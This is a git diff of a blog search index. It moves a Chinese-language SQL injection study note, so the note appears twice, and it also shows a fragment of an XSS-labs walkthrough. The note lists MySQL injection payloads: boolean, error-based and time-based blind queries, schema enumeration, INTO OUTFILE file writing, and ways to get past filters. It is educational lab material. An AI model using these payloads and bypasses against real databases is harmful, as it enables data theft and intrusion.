@@ -20,6 +20,57 @@
   </entry>
   <entry>
     <title></title>
+    <url>/2022/10/16/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="SQL注入学习笔记"><a href="#SQL注入学习笔记" class="headerlink" title="SQL注入学习笔记"></a>SQL注入学习笔记</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1625389326994-0be8a5eb-af50-4eb1-a2ef-dc29452d2839.png"></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="（1）注入的分类"><a href="#（1）注入的分类" class="headerlink" title="（1）注入的分类"></a>（1）注入的分类</h3><h4 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h4><h5 id="▲基于错误的-SQL-注入"><a href="#▲基于错误的-SQL-注入" class="headerlink" title="▲基于错误的 SQL 注入"></a>▲基于错误的 SQL 注入</h5><h5 id="▲联合查询的类型"><a href="#▲联合查询的类型" class="headerlink" title="▲联合查询的类型"></a>▲联合查询的类型</h5><h5 id="▲堆查询注射"><a href="#▲堆查询注射" class="headerlink" title="▲堆查询注射"></a>▲堆查询注射</h5><h5 id="▲SQL-盲注"><a href="#▲SQL-盲注" class="headerlink" title="▲SQL 盲注"></a>▲SQL 盲注</h5><h6 id="•基于布尔-SQL-盲注"><a href="#•基于布尔-SQL-盲注" class="headerlink" title="•基于布尔 SQL 盲注"></a>•基于布尔 SQL 盲注</h6><h6 id="•基于时间的-SQL-盲注"><a href="#•基于时间的-SQL-盲注" class="headerlink" title="•基于时间的 SQL 盲注"></a>•基于时间的 SQL 盲注</h6><h6 id="•基于报错的-SQL-盲注"><a href="#•基于报错的-SQL-盲注" class="headerlink" title="•基于报错的 SQL 盲注"></a>•基于报错的 SQL 盲注</h6><h4 id="基于如何处理输入的-SQL-查询（数据类型）"><a href="#基于如何处理输入的-SQL-查询（数据类型）" class="headerlink" title="基于如何处理输入的 SQL 查询（数据类型）"></a>基于如何处理输入的 SQL 查询（数据类型）</h4><h5 id="▲基于字符串"><a href="#▲基于字符串" class="headerlink" title="▲基于字符串"></a>▲基于字符串</h5><h5 id="▲数字或整数为基础的"><a href="#▲数字或整数为基础的" class="headerlink" title="▲数字或整数为基础的"></a>▲数字或整数为基础的</h5><h4 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h4><h5 id="▲通过用户输入的表单域的注射。"><a href="#▲通过用户输入的表单域的注射。" class="headerlink" title="▲通过用户输入的表单域的注射。"></a>▲通过用户输入的表单域的注射。</h5><h5 id="▲通过-cookie-注射。"><a href="#▲通过-cookie-注射。" class="headerlink" title="▲通过 cookie 注射。"></a>▲通过 cookie 注射。</h5><h5 id="▲通过服务器变量注射。-（基于头部信息的注射）"><a href="#▲通过服务器变量注射。-（基于头部信息的注射）" class="headerlink" title="▲通过服务器变量注射。 （基于头部信息的注射）"></a>▲通过服务器变量注射。 （基于头部信息的注射）</h5><h3 id="（2）系统函数"><a href="#（2）系统函数" class="headerlink" title="（2）系统函数"></a>（2）系统函数</h3><ol>
+<li>version()——MySQL 版本</li>
+<li>user()——数据库用户名</li>
+<li>database()——数据库名 </li>
+<li>@@datadir——数据库路径</li>
+<li>@@version_compile_os——操作系统版本</li>
+</ol>
+<h3 id="（3）字符串连接函数"><a href="#（3）字符串连接函数" class="headerlink" title="（3）字符串连接函数"></a>（3）字符串连接函数</h3><ol>
+<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
+<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
+<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
+</ol>
+<h3 id="（4）一般流程"><a href="#（4）一般流程" class="headerlink" title="（4）一般流程"></a>（4）一般流程</h3><h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><h6 id="select-schema-name-from-information-schema-schemata"><a href="#select-schema-name-from-information-schema-schemata" class="headerlink" title="select schema_name from information_schema.schemata"></a>select schema_name from information_schema.schemata</h6><h5 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h5><h6 id="select-table-name-from-information-schema-tables-where-table-schema-x3D-’xxxxx’"><a href="#select-table-name-from-information-schema-tables-where-table-schema-x3D-’xxxxx’" class="headerlink" title="select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’"></a>select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’</h6><h5 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h5><h6 id="select-column-name-from-information-schema-columns-where-table-name-x3D-’xxxxx’"><a href="#select-column-name-from-information-schema-columns-where-table-name-x3D-’xxxxx’" class="headerlink" title="select column_name from information_schema.columns where table_name&#x3D;’xxxxx’"></a>select column_name from information_schema.columns where table_name&#x3D;’xxxxx’</h6><h5 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h5><h6 id="select-from"><a href="#select-from" class="headerlink" title="select *** from ****"></a>select *** from ****</h6><p>PS：一般都会用到group_concat来显示所有数据。</p>
+<h3 id="（5）盲注"><a href="#（5）盲注" class="headerlink" title="（5）盲注"></a>（5）盲注</h3><h4 id="1、基于布尔-SQL-盲注———-构造逻辑判断"><a href="#1、基于布尔-SQL-盲注———-构造逻辑判断" class="headerlink" title="1、基于布尔 SQL 盲注———-构造逻辑判断"></a>1、基于布尔 SQL 盲注———-构造逻辑判断</h4><h6 id="▲left-database-1-gt-’s’-x2F-x2F-left-函数"><a href="#▲left-database-1-gt-’s’-x2F-x2F-left-函数" class="headerlink" title="▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数"></a>▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数</h6><p>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前b 位</p>
+<h6 id="▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema-x3D-database-limit-0-1-1-1-x3D-101-–-x2F-x2F-substr-函数，ascii-函数"><a href="#▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema-x3D-database-limit-0-1-1-1-x3D-101-–-x2F-x2F-substr-函数，ascii-函数" class="headerlink" title="▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数"></a>▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数</h6><p>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值 </p>
+<h6 id="▲ascii-substr-select-database-1-1-x3D-98"><a href="#▲ascii-substr-select-database-1-1-x3D-98" class="headerlink" title="▲ascii(substr((select database()),1,1))&#x3D;98"></a>▲ascii(substr((select database()),1,1))&#x3D;98</h6><h6 id="▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDERBY-id-LIMIT-0-1-1-1-gt-98-23-x2F-x2F-ORD-函数，MID-函数"><a href="#▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDERBY-id-LIMIT-0-1-1-1-gt-98-23-x2F-x2F-ORD-函数，MID-函数" class="headerlink" title="▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数"></a>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数</h6><p>Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值</p>
+<h6 id="▲regexp-正则注入-select-user-regexp-‘-a-z-’"><a href="#▲regexp-正则注入-select-user-regexp-‘-a-z-’" class="headerlink" title="▲regexp 正则注入 select user() regexp ‘^[a-z]’;"></a>▲regexp 正则注入 select user() regexp ‘^[a-z]’;</h6><p>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。</p>
+<h6 id="▲like-匹配注入"><a href="#▲like-匹配注入" class="headerlink" title="▲like 匹配注入"></a>▲like 匹配注入</h6><p>select user() like ‘ro%’</p>
+<h4 id="2、基于报错的-SQL-盲注——构造-payload-让信息通过错误提示回显出来"><a href="#2、基于报错的-SQL-盲注——构造-payload-让信息通过错误提示回显出来" class="headerlink" title="2、基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来"></a>2、基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来</h4><h6 id="▲extractvalue-1-concat-0x7e-select-version-0x7e-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误"><a href="#▲extractvalue-1-concat-0x7e-select-version-0x7e-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误" class="headerlink" title="▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误"></a>▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</h6><h6 id="▲updatexml-1-concat-0x7e-select-version-0x7e-1-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误"><a href="#▲updatexml-1-concat-0x7e-select-version-0x7e-1-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误" class="headerlink" title="▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误"></a>▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</h6><h6 id="▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x-x2F-x2F-mysql-重复特性，此处重复了-version，所以报错。"><a href="#▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x-x2F-x2F-mysql-重复特性，此处重复了-version，所以报错。" class="headerlink" title="▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。"></a>▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。</h6><h4 id="3、基于时间的-SQL-盲注———-延时注入"><a href="#3、基于时间的-SQL-盲注———-延时注入" class="headerlink" title="3、基于时间的 SQL 盲注———-延时注入"></a>3、基于时间的 SQL 盲注———-延时注入</h4><h6 id="▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-x2F-x2F-if-判断语句，条件为假，执行-sleep"><a href="#▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-x2F-x2F-if-判断语句，条件为假，执行-sleep" class="headerlink" title="▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep"></a>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep</h6><h3 id="（6）导入导出相关操作"><a href="#（6）导入导出相关操作" class="headerlink" title="（6）导入导出相关操作"></a>（6）导入导出相关操作</h3><h5 id="1、load-file-导出文件"><a href="#1、load-file-导出文件" class="headerlink" title="1、load_file()导出文件"></a>1、load_file()导出文件</h5><h5 id="2、文件导入到数据库"><a href="#2、文件导入到数据库" class="headerlink" title="2、文件导入到数据库"></a>2、文件导入到数据库</h5><h5 id="3、导入到文件"><a href="#3、导入到文件" class="headerlink" title="3、导入到文件"></a>3、导入到文件</h5><p>SELECT…..INTO OUTFILE ‘file_name’</p>
+<p>Select  …… into outfile “c:\phpnow\htdocs\test.php”</p>
+<h3 id="（7）增删改函数"><a href="#（7）增删改函数" class="headerlink" title="（7）增删改函数"></a>（7）增删改函数</h3><h5 id="1、插入"><a href="#1、插入" class="headerlink" title="1、插入"></a>1、插入</h5><p>insert into users values(‘16’,’lcamry’,’lcamry’);</p>
+<h5 id="2、删除"><a href="#2、删除" class="headerlink" title="2、删除"></a>2、删除</h5><p>删数据: delete from </p>
+<p>表名; delete from 表名 where id&#x3D;1; </p>
+<p> 删除结构： </p>
+<p>删数据库：drop database 数据库名; </p>
+<p>删除表：drop table 表名; </p>
+<p>删除表中的列:alter table 表名 drop column 列名;</p>
+<p>ps:delete from users where id&#x3D;16</p>
+<h5 id="3、修改-x2F-更新"><a href="#3、修改-x2F-更新" class="headerlink" title="3、修改&#x2F;更新"></a>3、修改&#x2F;更新</h5><p>修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; </p>
+<p>带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;</p>
+<p>ps: update users set username&#x3D;’tt’ where id&#x3D;15</p>
+<h3 id="（8）HTTP-头部"><a href="#（8）HTTP-头部" class="headerlink" title="（8）HTTP 头部"></a>（8）HTTP 头部</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>如何绕过 or 和 and 过滤。一般性提供以下几种思路：</p>
+<p>（1）大小写变形 Or,OR,oR </p>
+<p>（2）编码，hex，urlencode </p>
+<p>（3）添加注释&#x2F;<em>or</em>&#x2F; </p>
+<p>（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||</p>
+<p>对于注释和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；</p>
+<p>对于空格，有较多的方法：</p>
+<p> %09 TAB 键（水平）</p>
+<p> %0a 新建一行</p>
+<p> %0c 新的一页</p>
+<p> %0d return 功能 </p>
+<p>%0b TAB 键（垂直）</p>
+<p> %a0 空格</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
     <url>/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="XSS-labs通关笔记"><a href="#XSS-labs通关笔记" class="headerlink" title="XSS-labs通关笔记"></a>XSS-labs通关笔记</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911140948713.png" alt="image-20220911140948713"></p>
 <p>我们可以看到这里将name的参数值，插入到了<h2> </h2>中，这里就是反射型xss，直接给name重新赋值。</p>
@@ -384,57 +435,6 @@ echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&l
 <p>可以看到和我们的猜测一致</p>
 <h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>与17关一致</p>
 <h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>与之前一致，不过用了引号将src闭合，所以不能直接在后面添加语句，我们可以通过F12控制台添加</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2022/10/16/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="SQL注入学习笔记"><a href="#SQL注入学习笔记" class="headerlink" title="SQL注入学习笔记"></a>SQL注入学习笔记</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1625389326994-0be8a5eb-af50-4eb1-a2ef-dc29452d2839.png"></p>
-<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="（1）注入的分类"><a href="#（1）注入的分类" class="headerlink" title="（1）注入的分类"></a>（1）注入的分类</h3><h4 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h4><h5 id="▲基于错误的-SQL-注入"><a href="#▲基于错误的-SQL-注入" class="headerlink" title="▲基于错误的 SQL 注入"></a>▲基于错误的 SQL 注入</h5><h5 id="▲联合查询的类型"><a href="#▲联合查询的类型" class="headerlink" title="▲联合查询的类型"></a>▲联合查询的类型</h5><h5 id="▲堆查询注射"><a href="#▲堆查询注射" class="headerlink" title="▲堆查询注射"></a>▲堆查询注射</h5><h5 id="▲SQL-盲注"><a href="#▲SQL-盲注" class="headerlink" title="▲SQL 盲注"></a>▲SQL 盲注</h5><h6 id="•基于布尔-SQL-盲注"><a href="#•基于布尔-SQL-盲注" class="headerlink" title="•基于布尔 SQL 盲注"></a>•基于布尔 SQL 盲注</h6><h6 id="•基于时间的-SQL-盲注"><a href="#•基于时间的-SQL-盲注" class="headerlink" title="•基于时间的 SQL 盲注"></a>•基于时间的 SQL 盲注</h6><h6 id="•基于报错的-SQL-盲注"><a href="#•基于报错的-SQL-盲注" class="headerlink" title="•基于报错的 SQL 盲注"></a>•基于报错的 SQL 盲注</h6><h4 id="基于如何处理输入的-SQL-查询（数据类型）"><a href="#基于如何处理输入的-SQL-查询（数据类型）" class="headerlink" title="基于如何处理输入的 SQL 查询（数据类型）"></a>基于如何处理输入的 SQL 查询（数据类型）</h4><h5 id="▲基于字符串"><a href="#▲基于字符串" class="headerlink" title="▲基于字符串"></a>▲基于字符串</h5><h5 id="▲数字或整数为基础的"><a href="#▲数字或整数为基础的" class="headerlink" title="▲数字或整数为基础的"></a>▲数字或整数为基础的</h5><h4 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h4><h5 id="▲通过用户输入的表单域的注射。"><a href="#▲通过用户输入的表单域的注射。" class="headerlink" title="▲通过用户输入的表单域的注射。"></a>▲通过用户输入的表单域的注射。</h5><h5 id="▲通过-cookie-注射。"><a href="#▲通过-cookie-注射。" class="headerlink" title="▲通过 cookie 注射。"></a>▲通过 cookie 注射。</h5><h5 id="▲通过服务器变量注射。-（基于头部信息的注射）"><a href="#▲通过服务器变量注射。-（基于头部信息的注射）" class="headerlink" title="▲通过服务器变量注射。 （基于头部信息的注射）"></a>▲通过服务器变量注射。 （基于头部信息的注射）</h5><h3 id="（2）系统函数"><a href="#（2）系统函数" class="headerlink" title="（2）系统函数"></a>（2）系统函数</h3><ol>
-<li>version()——MySQL 版本</li>
-<li>user()——数据库用户名</li>
-<li>database()——数据库名 </li>
-<li>@@datadir——数据库路径</li>
-<li>@@version_compile_os——操作系统版本</li>
-</ol>
-<h3 id="（3）字符串连接函数"><a href="#（3）字符串连接函数" class="headerlink" title="（3）字符串连接函数"></a>（3）字符串连接函数</h3><ol>
-<li>concat(str1,str2,…)——没有分隔符地连接字符串</li>
-<li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li>
-<li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据</li>
-</ol>
-<h3 id="（4）一般流程"><a href="#（4）一般流程" class="headerlink" title="（4）一般流程"></a>（4）一般流程</h3><h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><h6 id="select-schema-name-from-information-schema-schemata"><a href="#select-schema-name-from-information-schema-schemata" class="headerlink" title="select schema_name from information_schema.schemata"></a>select schema_name from information_schema.schemata</h6><h5 id="猜某库的数据表"><a href="#猜某库的数据表" class="headerlink" title="猜某库的数据表"></a>猜某库的数据表</h5><h6 id="select-table-name-from-information-schema-tables-where-table-schema-x3D-’xxxxx’"><a href="#select-table-name-from-information-schema-tables-where-table-schema-x3D-’xxxxx’" class="headerlink" title="select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’"></a>select table_name from information_schema.tables where table_schema&#x3D;’xxxxx’</h6><h5 id="猜某表的所有列"><a href="#猜某表的所有列" class="headerlink" title="猜某表的所有列"></a>猜某表的所有列</h5><h6 id="select-column-name-from-information-schema-columns-where-table-name-x3D-’xxxxx’"><a href="#select-column-name-from-information-schema-columns-where-table-name-x3D-’xxxxx’" class="headerlink" title="select column_name from information_schema.columns where table_name&#x3D;’xxxxx’"></a>select column_name from information_schema.columns where table_name&#x3D;’xxxxx’</h6><h5 id="获取某列的内容"><a href="#获取某列的内容" class="headerlink" title="获取某列的内容"></a>获取某列的内容</h5><h6 id="select-from"><a href="#select-from" class="headerlink" title="select *** from ****"></a>select *** from ****</h6><p>PS：一般都会用到group_concat来显示所有数据。</p>
-<h3 id="（5）盲注"><a href="#（5）盲注" class="headerlink" title="（5）盲注"></a>（5）盲注</h3><h4 id="1、基于布尔-SQL-盲注———-构造逻辑判断"><a href="#1、基于布尔-SQL-盲注———-构造逻辑判断" class="headerlink" title="1、基于布尔 SQL 盲注———-构造逻辑判断"></a>1、基于布尔 SQL 盲注———-构造逻辑判断</h4><h6 id="▲left-database-1-gt-’s’-x2F-x2F-left-函数"><a href="#▲left-database-1-gt-’s’-x2F-x2F-left-函数" class="headerlink" title="▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数"></a>▲left(database(),1)&gt;’s’ &#x2F;&#x2F;left()函数</h6><p>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前b 位</p>
-<h6 id="▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema-x3D-database-limit-0-1-1-1-x3D-101-–-x2F-x2F-substr-函数，ascii-函数"><a href="#▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema-x3D-database-limit-0-1-1-1-x3D-101-–-x2F-x2F-substr-函数，ascii-函数" class="headerlink" title="▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数"></a>▲ascii(substr((select table_name information_schema.tables where tables_schema&#x3D;database()limit 0,1),1,1))&#x3D;101 –+ &#x2F;&#x2F;substr()函数，ascii()函数</h6><p>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值 </p>
-<h6 id="▲ascii-substr-select-database-1-1-x3D-98"><a href="#▲ascii-substr-select-database-1-1-x3D-98" class="headerlink" title="▲ascii(substr((select database()),1,1))&#x3D;98"></a>▲ascii(substr((select database()),1,1))&#x3D;98</h6><h6 id="▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDERBY-id-LIMIT-0-1-1-1-gt-98-23-x2F-x2F-ORD-函数，MID-函数"><a href="#▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDERBY-id-LIMIT-0-1-1-1-gt-98-23-x2F-x2F-ORD-函数，MID-函数" class="headerlink" title="▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数"></a>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数</h6><p>Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值</p>
-<h6 id="▲regexp-正则注入-select-user-regexp-‘-a-z-’"><a href="#▲regexp-正则注入-select-user-regexp-‘-a-z-’" class="headerlink" title="▲regexp 正则注入 select user() regexp ‘^[a-z]’;"></a>▲regexp 正则注入 select user() regexp ‘^[a-z]’;</h6><p>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。</p>
-<h6 id="▲like-匹配注入"><a href="#▲like-匹配注入" class="headerlink" title="▲like 匹配注入"></a>▲like 匹配注入</h6><p>select user() like ‘ro%’</p>
-<h4 id="2、基于报错的-SQL-盲注——构造-payload-让信息通过错误提示回显出来"><a href="#2、基于报错的-SQL-盲注——构造-payload-让信息通过错误提示回显出来" class="headerlink" title="2、基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来"></a>2、基于报错的 SQL 盲注——构造 payload 让信息通过错误提示回显出来</h4><h6 id="▲extractvalue-1-concat-0x7e-select-version-0x7e-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误"><a href="#▲extractvalue-1-concat-0x7e-select-version-0x7e-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误" class="headerlink" title="▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误"></a>▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</h6><h6 id="▲updatexml-1-concat-0x7e-select-version-0x7e-1-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误"><a href="#▲updatexml-1-concat-0x7e-select-version-0x7e-1-x2F-x2F-mysql-对xml-数据进行查询和修改的-xpath-函数，xpath-语法错误" class="headerlink" title="▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误"></a>▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) &#x2F;&#x2F;mysql 对xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</h6><h6 id="▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x-x2F-x2F-mysql-重复特性，此处重复了-version，所以报错。"><a href="#▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x-x2F-x2F-mysql-重复特性，此处重复了-version，所以报错。" class="headerlink" title="▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。"></a>▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; &#x2F;&#x2F;mysql 重复特性，此处重复了 version，所以报错。</h6><h4 id="3、基于时间的-SQL-盲注———-延时注入"><a href="#3、基于时间的-SQL-盲注———-延时注入" class="headerlink" title="3、基于时间的 SQL 盲注———-延时注入"></a>3、基于时间的 SQL 盲注———-延时注入</h4><h6 id="▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-x2F-x2F-if-判断语句，条件为假，执行-sleep"><a href="#▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-x2F-x2F-if-判断语句，条件为假，执行-sleep" class="headerlink" title="▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep"></a>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 &#x2F;&#x2F;if 判断语句，条件为假，执行 sleep</h6><h3 id="（6）导入导出相关操作"><a href="#（6）导入导出相关操作" class="headerlink" title="（6）导入导出相关操作"></a>（6）导入导出相关操作</h3><h5 id="1、load-file-导出文件"><a href="#1、load-file-导出文件" class="headerlink" title="1、load_file()导出文件"></a>1、load_file()导出文件</h5><h5 id="2、文件导入到数据库"><a href="#2、文件导入到数据库" class="headerlink" title="2、文件导入到数据库"></a>2、文件导入到数据库</h5><h5 id="3、导入到文件"><a href="#3、导入到文件" class="headerlink" title="3、导入到文件"></a>3、导入到文件</h5><p>SELECT…..INTO OUTFILE ‘file_name’</p>
-<p>Select  …… into outfile “c:\phpnow\htdocs\test.php”</p>
-<h3 id="（7）增删改函数"><a href="#（7）增删改函数" class="headerlink" title="（7）增删改函数"></a>（7）增删改函数</h3><h5 id="1、插入"><a href="#1、插入" class="headerlink" title="1、插入"></a>1、插入</h5><p>insert into users values(‘16’,’lcamry’,’lcamry’);</p>
-<h5 id="2、删除"><a href="#2、删除" class="headerlink" title="2、删除"></a>2、删除</h5><p>删数据: delete from </p>
-<p>表名; delete from 表名 where id&#x3D;1; </p>
-<p> 删除结构： </p>
-<p>删数据库：drop database 数据库名; </p>
-<p>删除表：drop table 表名; </p>
-<p>删除表中的列:alter table 表名 drop column 列名;</p>
-<p>ps:delete from users where id&#x3D;16</p>
-<h5 id="3、修改-x2F-更新"><a href="#3、修改-x2F-更新" class="headerlink" title="3、修改&#x2F;更新"></a>3、修改&#x2F;更新</h5><p>修改所有：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ ; </p>
-<p>带条件的修改：updata 表名 set 列名&#x3D;’新的值，非数字加单引号’ where id&#x3D;6;</p>
-<p>ps: update users set username&#x3D;’tt’ where id&#x3D;15</p>
-<h3 id="（8）HTTP-头部"><a href="#（8）HTTP-头部" class="headerlink" title="（8）HTTP 头部"></a>（8）HTTP 头部</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>如何绕过 or 和 and 过滤。一般性提供以下几种思路：</p>
-<p>（1）大小写变形 Or,OR,oR </p>
-<p>（2）编码，hex，urlencode </p>
-<p>（3）添加注释&#x2F;<em>or</em>&#x2F; </p>
-<p>（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||</p>
-<p>对于注释和结尾字符的我们此处只能利用构造一个 ’ 来闭合后面到 ’ ；</p>
-<p>对于空格，有较多的方法：</p>
-<p> %09 TAB 键（水平）</p>
-<p> %0a 新建一行</p>
-<p> %0c 新的一页</p>
-<p> %0d return 功能 </p>
-<p>%0b TAB 键（垂直）</p>
-<p> %a0 空格</p>
 ]]></content>
   </entry>
 </search>
